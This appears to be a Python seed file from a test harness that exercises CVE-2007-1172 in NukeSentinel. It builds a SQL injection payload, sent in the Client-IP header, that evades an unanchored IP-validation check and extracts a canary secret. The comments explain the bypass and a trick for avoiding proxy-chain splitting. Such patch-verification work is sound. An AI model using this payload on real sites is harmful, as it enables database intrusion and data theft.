# [GIVEN] CVE-2007-1172 seed exploit — SQLi via the Client-IP HTTP header.
#
# NukeSentinel reads the client IP from the attacker-controlled `Client-IP` header
# (get_client_ip -> HTTP_CLIENT_IP) and interpolates it RAW into the _nsnst_tracked_ips
# INSERT (14 columns). On V0 (2.5.05) the IP-validation ereg is UNANCHORED, so a payload
# that merely CONTAINS a dotted-quad anywhere passes validation and injects a sub-SELECT
# that copies the per-run canary out of pcb_secret into the tracked row.
#
# This payload does NOT start with a valid IP (it opens with a quote to close the ip_addr
# field), so on V1 (2.5.06) whose patch added a START-anchored `^ip` ereg, it is reset to
# "none" and BLOCKED.
#
# NOTE: commas in the payload must NOT be followed by a space (`, `) because the real
# nukesentinel.php get_ip() splits on `, ` to handle proxy chains (X-Forwarded-For: a, b).
# Using `','` (no space) avoids the split and keeps the injection intact.

import json

PAYLOAD = (
    "','0','/','x','x','x',"
    "(SELECT secret FROM pcb_secret LIMIT 1),"
    "'x','x','x','x')-- 1.2.3.4"
)


def candidate():
    """CVE1 seed: Client-IP header carrying the un-prefixed SQLi payload."""
    return {
        "probe_id": "cve-2007-1172-original",
        "header_name": "Client-IP",
        "header_value": PAYLOAD,
    }


if __name__ == "__main__":
    print(json.dumps(candidate()))
